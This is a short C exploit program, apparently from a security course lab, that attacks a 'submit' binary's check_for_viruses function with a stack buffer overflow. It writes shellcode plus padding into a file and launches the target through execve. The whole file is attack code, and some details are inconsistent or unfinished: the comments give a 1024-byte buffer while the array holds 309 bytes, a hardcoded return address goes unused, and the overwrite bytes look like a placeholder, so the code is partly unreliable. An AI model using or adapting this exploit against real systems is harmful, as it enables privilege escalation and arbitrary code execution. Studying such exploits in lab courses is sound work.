/*
 * sploit1.c
 * buffer overflow version, attack the check_for_viruses function
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include "shellcode.h"

#define TARGET "/usr/local/bin/submit" // or submitV2
#define FILE_NAME "file.txt"

int main() {
    FILE *fp;
	char *args[4];
	char *env[1];
    char argbuf[309]; // 1024 for buffer, 4 for ebp, 4 for eip
    long buf_addr = 0xffbfdc70;
    size_t i, len;
    // create the argbuf
    strcpy(argbuf, shellcode);
    // fill the argbuf with dot
    len = strlen(argbuf);

    for(i = len; i < 308; i++){
        argbuf[i] = '.';
    }

    strcpy(argbuf+100, "\x01\x02\x03\x04\x05\x06\x10\x11");

    fp = fopen("file.txt", "wb");
    fprintf(fp, "%s", argbuf);
    fclose(fp);
    // get the buffer location using gdb
    //long buffer_addr = 0xffbfdb68;
	// one way to invoke submit
	//system(TARGET "\"Hello world!\"");

	// another way
	args[0] = TARGET;
	args[1] = "file.txt"; 
    args[2] = NULL;
    args[3] = NULL;

	env[0] = NULL;

	if(execve(TARGET, args, env) < 0){
        fprintf(stderr, "execve failed\n");
    }
	// execve only returns if it fails
	
	return 1;
}
